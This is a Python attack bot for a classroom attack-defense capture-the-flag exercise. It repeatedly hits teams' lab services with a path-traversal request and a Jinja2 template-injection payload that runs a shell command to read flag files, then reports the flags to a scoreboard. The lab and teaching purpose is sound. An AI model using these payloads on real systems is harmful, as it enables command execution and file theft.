"""bot —— 代替其他隊伍打你。

每輪打兩條路，各拿一條 flag：
  1. 路徑穿越  /download?file=../flag1.txt
  2. 模板注入  /hello?name={{…os.popen('cat /srv/flag2.txt')…}}
打到的交到記分板：你扣分、bot 加分。洞補掉的那一條，它就打不到——這就是防禦分。

（第三條 flag3 走 SQL 注入 → /admin，課堂上沒有 bot 打它，留給對手。）
"""
import os
import re
import time

import requests

INTERVAL = int(os.environ.get("INTERVAL", "45"))
BOARD = os.environ["BOARD"].rstrip("/")
VICTIM = os.environ["VICTIM"].rstrip("/")
TOKEN = os.environ.get("BOARD_TOKEN", "").strip()
HEADERS = {"X-Board-Token": TOKEN}

# 模板注入的 payload：Jinja2 的屬性鏈，直接讀那條 flag
SSTI = "{{cycler.__init__.__globals__.os.popen('cat /srv/flag2.txt').read()}}"
FLAG_RE = re.compile(r"flag\{[0-9a-f]+\}")


def steal_traversal():
    r = requests.get(VICTIM + "/download", params={"file": "../flag1.txt"}, timeout=3)
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


def steal_ssti():
    r = requests.get(VICTIM + "/hello", params={"name": SSTI}, timeout=3)
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


ROUTES = (("flag1 路徑穿越", steal_traversal), ("flag2 模板注入", steal_ssti))

# 開場先等幾秒：checker 要把這一輪的三條 flag 送進記分板，bot 才交得進去；
# 之後每輪的出手也剛好落在換 flag 之後，不會跟那一下撞在一起。
START_DELAY = 5


def attempt() -> None:
    for label, fn in ROUTES:
        try:
            flag = fn()
        except Exception as exc:
            print(f"[bot] {label}: victim unreachable ({exc})", flush=True)
            continue
        if not flag:
            print(f"[bot] {label}: blocked", flush=True)
            continue
        print(f"[bot] {label}: stole {flag}", flush=True)
        try:
            requests.post(BOARD + "/api/steal", json={"by": "bot", "flag": flag},
                          headers=HEADERS, timeout=3)
        except Exception as exc:
            print(f"[bot] {label}: submit failed ({exc})", flush=True)


if __name__ == "__main__":
    time.sleep(START_DELAY)
    while True:
        attempt()
        time.sleep(INTERVAL)
